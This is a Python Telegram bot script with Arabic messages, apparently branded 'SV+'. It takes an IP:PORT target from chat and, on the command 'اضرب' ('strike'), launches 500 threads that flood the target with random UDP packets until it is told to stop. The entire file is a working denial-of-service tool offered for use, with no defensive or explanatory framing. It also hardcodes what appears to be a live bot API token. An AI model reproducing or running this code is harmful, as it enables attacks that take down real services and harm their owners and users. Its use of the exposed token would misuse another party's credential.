import telebot
import socket
import threading
import random

# --- توكن مؤسس SV+ ---
TOKEN = '8670266834:AAGb6LDtMN-vgXGVZUwYzUp8n8fT6VJCb34'
bot = telebot.TeleBot(TOKEN)

is_attacking = False
target = {"ip": "", "port": 0}

def attack_engine(ip, port):
    global is_attacking
    data = random._urandom(1024) 
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while is_attacking:
        try:
            client.sendto(data, (ip, port))
        except:
            break
    client.close()

@bot.message_handler(func=lambda m: True)
def handle_commands(message):
    global is_attacking, target
    text = message.text.strip().lower()

    if text == "بوت":
        bot.reply_to(message, "🛡️ **أهلاً مؤسس SV+**\nارسل الهدف هكذا `IP:PORT`\nمثال: `91.108.9.151:80`")

    elif ":" in text:
        try:
            ip, port = text.split(':')
            target["ip"], target["port"] = ip, int(port)
            bot.reply_to(message, f"🎯 تم التثبيت: `{ip}:{port}`\nاكتب **اضرب** للبدء!")
        except:
            bot.reply_to(message, "❌ خطأ بالتنسيق!")

    elif text == "اضرب":
        if not target["ip"]: return bot.reply_to(message, "❌ حدد هدفاً!")
        is_attacking = True
        bot.reply_to(message, "🚀 **هجوم SV+ العنيف بدأ (500 خيط)!**")
        for _ in range(500): 
            threading.Thread(target=attack_engine, args=(target["ip"], target["port"]), daemon=True).start()

    elif text == "توقف":
        is_attacking = False
        bot.reply_to(message, "🛑 توقف الهجوم.")

bot.infinity_polling()
